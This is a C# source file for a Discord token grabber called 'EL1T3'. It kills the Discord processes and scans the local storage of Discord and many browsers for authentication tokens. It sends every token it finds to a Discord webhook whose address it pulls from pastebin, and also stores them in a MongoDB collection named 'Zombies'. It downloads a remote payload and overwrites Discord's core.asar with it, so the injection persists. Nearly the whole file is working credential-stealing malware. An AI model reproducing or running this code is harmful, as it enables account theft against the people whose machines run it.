using MongoDB.Bson.Serialization.Attributes;
using System.Collections.Specialized;
using System.Text.RegularExpressions;
using System.Collections.Generic;
using System.Diagnostics;
using MongoDB.Driver;
using MongoDB.Bson;
using System.Linq;
using System.Net;
using System.IO;
using System;

namespace EL1T3.Modules
{
    internal class Grabber
    {
        internal static string LocalDirectory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        internal static string RoamiDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        internal static readonly MongoClient db_client = new MongoClient("mongodb+srv://username:password@cluster/database?retryWrites=true&w=majority");

        internal static List<string> DiscordPath = new List<string>
            {
                    $"{RoamiDirectory}\\Discord\\",
                    $"{RoamiDirectory}\\Lightcord\\",
                    $"{RoamiDirectory}\\discordptb\\",
                    $"{RoamiDirectory}\\discordcanary\\",
                    $"{RoamiDirectory}\\Opera Software\\Opera Stable\\",
                    $"{RoamiDirectory}\\Opera Software\\Opera GX Stable\\",

                    $"{LocalDirectory}\\discord\\",
                    $"{LocalDirectory}\\Amigo\\User Data\\",
                    $"{LocalDirectory}\\Torch\\User Data\\",
                    $"{LocalDirectory}\\Kometa\\User Data\\",
                    $"{LocalDirectory}\\Orbitum\\User Data\\",
                    $"{LocalDirectory}\\CentBrowser\\User Data\\",
                    $"{LocalDirectory}\\7Star\\7Star\\User Data\\",
                    $"{LocalDirectory}\\Sputnik\\Sputnik\\User Data\\",
                    $"{LocalDirectory}\\Vivaldi\\User Data\\Default\\",
                    $"{LocalDirectory}\\Google\\Chrome SxS\\User Data\\",
                    $"{LocalDirectory}\\Epic Privacy Browser\\User Data\\",
                    $"{LocalDirectory}\\Google\\Chrome\\User Data\\Default\\",
                    $"{LocalDirectory}\\uCozMedia\\Uran\\User Data\\Default\\",
                    $"{LocalDirectory}\\Microsoft\\Edge\\User Data\\Default\\",
                    $"{LocalDirectory}\\Yandex\\YandexBrowser\\User Data\\Default\\",
                    $"{LocalDirectory}\\Opera Software\\Opera Neon\\User Data\\Default\\",
                    $"{LocalDirectory}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\",
            };

        internal static List<string> ProcessToKill = new List<string>
            {
                "DiscordDevelopment",
                "DiscordPTB",
                "Lightcord",
                "Discord",
                "discord",
            };

        private class AccountSchema
        {
            public ObjectId Id { get; set; }

            [BsonElement("RawZombies")]
            public String Token { get; set; }
        }

        private static void sendDiscordWebhook(string message)
        {
            NameValueCollection discordValues = new NameValueCollection();
            discordValues.Add("username", "EL1T3 | By Vichy");
            discordValues.Add("avatar_url", "https://th.bing.com/th/id/R4695dcbcaf9227e0463c39646e19724f?rik=NzD3W2dvj8ajmw&pid=ImgRaw");
            discordValues.Add("content", message);
            new WebClient().UploadValues(new WebClient().DownloadString("https://pastebin.com/raw/xxxxx"), discordValues); // Pastebin with core.asar download url
        }

        internal static void EL1T3()
        {
            var Payload = new WebClient().DownloadString(new WebClient().DownloadString("https://pastebin.com/raw/25vy0kEq"));

            ProcessToKill.ForEach(proc =>
            {
                foreach (var process in Process.GetProcessesByName(proc))
                {
                    try
                    {
                        process.Kill();
                    }
                    catch { }
                }
            });

            DiscordPath.ForEach(path =>
            {
                if (!Directory.Exists(path)) return;

                Directory.GetFiles(path, "*.*", SearchOption.AllDirectories).Where(s => s.ToLower().EndsWith(".ldb") || s.ToLower().EndsWith(".log") || s.ToLower().EndsWith("core.asar")).ToList<string>().ForEach(file =>
                {
                    try
                    {
                        if (file.EndsWith("core.asar"))
                        {
                            File.WriteAllText(file, Payload);
                            sendDiscordWebhook($"> **Injected: ``{file}``**");
                        }
                        else
                        {
                            foreach (var Match in Regex.Matches(File.ReadAllText(file), @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}"))
                            {
                                sendDiscordWebhook($"```\n===============================[ FOUND ]===============================\n[+] File : {file}\n[+] Token: {Match}\n=======================================================================\n```");

                                try
                                {
                                    IMongoDatabase db = db_client.GetDatabase("Zombies");
                                    IMongoCollection<AccountSchema> dbCollection = db.GetCollection<AccountSchema>("RawZombies");

                                    var Shema = new AccountSchema();
                                    Shema.Token = Match.ToString();

                                    dbCollection.InsertOne(Shema);
                                }
                                catch { }
                            }
                        }
                    }
                    catch { }
                });
            });
        }
    }
}
